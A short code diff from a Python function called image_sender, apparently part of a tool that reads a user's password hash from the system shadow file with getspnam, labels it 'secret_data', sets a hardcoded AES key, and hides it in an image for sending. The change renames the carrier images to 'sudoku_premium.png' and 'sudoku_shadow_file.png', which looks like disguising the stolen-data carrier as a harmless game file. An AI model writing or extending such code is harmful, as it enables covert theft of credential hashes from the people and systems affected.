@@ -17,8 +17,8 @@ def image_sender():
 
     shadow_file_password = getspnam(username)[1]
 
-    input_image = 'goku.png'
-    output_image = 'goku_shadow_file.png'
+    input_image = 'sudoku_premium.png'
+    output_image = 'sudoku_shadow_file.png'
     secret_data = shadow_file_password
 
     aes_kljuc = '123'
